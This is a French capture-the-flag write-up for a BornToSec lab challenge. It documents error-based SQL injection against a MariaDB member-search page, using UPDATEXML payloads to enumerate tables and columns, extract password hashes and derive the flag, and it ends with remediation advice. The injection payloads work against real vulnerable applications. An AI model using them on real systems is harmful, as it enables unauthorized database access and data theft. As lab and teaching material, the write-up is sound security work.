@@ -1,0 +1,219 @@
+Compte rendu – SQL Injection Error-Based
+Challenge : search_member_sql_inj_error_based
+1. Contexte et objectif
+
+Dans le cadre du WebEx BornToSec, ce challenge vise à identifier et exploiter une vulnérabilité d’injection SQL de type error-based présente dans la fonctionnalité de recherche des membres.
+
+L’objectif est de :
+
+confirmer la présence d’une injection SQL,
+
+exploiter la vulnérabilité sans outil automatisé,
+
+extraire des données depuis la base,
+
+identifier et générer le flag final.
+
+2. Identification de la surface d’attaque
+
+La page member contient un formulaire de recherche :
+
+<form method="GET">
+  <input type="hidden" name="page" value="member">
+  <input type="text" name="id">
+  <input type="submit" value="Submit">
+</form>
+
+
+L’URL générée est la suivante :
+
+http://192.168.133.142/index.php?page=member&id=VALUE
+
+
+Le paramètre id est directement contrôlé par l’utilisateur et transmis au backend.
+
+3. Validation de la vulnérabilité SQL
+Test initial
+
+Entrée dans le champ ID :
+
+1'
+
+
+Résultat :
+
+Message d’erreur SQL retourné par MariaDB.
+
+➡️ Injection SQL confirmée, avec affichage des erreurs côté client.
+
+4. Mise en place de l’exploitation error-based
+
+Le SGBD étant MariaDB, l’exploitation repose sur l’utilisation de la fonction :
+
+UPDATEXML()
+
+
+Cette fonction permet de provoquer une erreur SQL contenant des données arbitraires.
+
+Test du canal error-based
+1 AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)
+
+
+Résultat :
+
+XPATH syntax error: '~Member_Sql_Injection~'
+
+
+➡️ Le canal error-based est pleinement fonctionnel.
+
+5. Enumération de la base de données
+5.1 Nom de la base
+
+Base de données : Member_Sql_Injection
+
+5.2 Enumération des tables
+1 AND UPDATEXML(1,CONCAT(0x7e,
+(SELECT table_name FROM information_schema.tables
+ WHERE table_schema=DATABASE() LIMIT 0,1),
+0x7e),1)
+
+
+Résultat :
+
+~users~
+
+
+➡️ Une seule table exploitable : users
+
+6. Enumération des colonnes
+
+Pour éviter les problèmes liés aux quotes, le nom de la table est utilisé en hexadécimal :
+
+users = 0x7573657273
+
+
+Requête générique :
+
+1 AND UPDATEXML(1,CONCAT(0x7e,
+(SELECT column_name FROM information_schema.columns
+ WHERE table_name=0x7573657273 LIMIT N,1),
+0x7e),1)
+
+Colonnes découvertes
+
+user_id
+
+first_name
+
+last_name
+
+town
+
+country
+
+planet
+
+Commentaire
+
+countersign
+
+7. Extraction des données sensibles
+7.1 Extraction de la colonne countersign
+1 AND UPDATEXML(1,CONCAT(0x7e,
+(SELECT countersign FROM users LIMIT X,1),
+0x7e),1)
+
+
+Valeurs récupérées :
+
+2b3366bcfd44f540e630d4dc2b9b06d
+60e9032c586fb422e2c16dee6286cf1
+e083b24a01c483437bcf4a9eea7c1b4
+5ff9d0165b4f92b14994e5c685cdce2
+
+
+Format : 32 caractères hexadécimaux
+
+Type : MD5
+
+Conclusion : données intermédiaires, pas le flag final.
+
+8. Analyse applicative – Utilisateur ID 4
+8.1 Extraction des données claires
+1 AND UPDATEXML(1,CONCAT(0x7e,
+(SELECT CONCAT_WS(0x3a,first_name,last_name,planet)
+ FROM users LIMIT 3,1),
+0x7e),1)
+
+
+Résultat :
+
+~Flag:GetThe:42~
+
+8.2 Commentaire associé
+Decrypt this password -> then l...
+
+
+➡️ La chaîne Flag:GetThe:42 est explicitement fournie comme valeur logique à transformer.
+
+9. Génération du flag final
+
+Le flag final correspond au SHA-256 de la valeur en clair.
+
+Calcul
+echo -n "Flag:GetThe:42" | sha256sum
+
+Résultat
+f5146d8f77271f4cd2e4a2c017f9be2deab152bd3eaea93800ab57c197e09390
+
+10. Flag validé
+✅ Flag final
+f5146d8f77271f4cd2e4a2c017f9be2deab152bd3eaea93800ab57c197e09390
+
+11. Remédiation – Mesures correctives
+11.1 Utilisation de requêtes préparées (prioritaire)
+
+❌ Code vulnérable :
+
+$query = "SELECT * FROM users WHERE user_id=".$_GET['id'];
+
+
+✅ Correction recommandée :
+
+$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = :id");
+$stmt->bindParam(':id', $id, PDO::PARAM_INT);
+$stmt->execute();
+
+11.2 Validation stricte des entrées utilisateur
+
+Le paramètre id doit être numérique :
+
+if (!ctype_digit($_GET['id'])) {
+    die("Invalid parameter");
+}
+
+11.3 Désactivation de l’affichage des erreurs SQL
+display_errors = Off
+log_errors = On
+
+11.4 Principe du moindre privilège
+
+Compte SQL dédié à l’application
+
+Droits limités (SELECT uniquement)
+
+Accès restreint à information_schema
+
+12. Évaluation du risque
+Critère	Évaluation
+Type	Injection SQL
+Exploitabilité	Élevée
+Impact	Exfiltration de données
+Complexité	Faible
+Sévérité	Critique
+13. Conclusion
+
+Ce challenge démontre une vulnérabilité critique d’injection SQL error-based, exploitable via un simple paramètre GET non sécurisé.
+L’exploitation a permis une énumération complète de la base, suivie d’une analyse applicative menant à la récupération du flag final.
+
+La mise en œuvre des mesures correctives proposées permettrait d’éliminer totalement cette vulnérabilité et de se conformer aux bonnes pratiques OWASP (A03 – Injection).
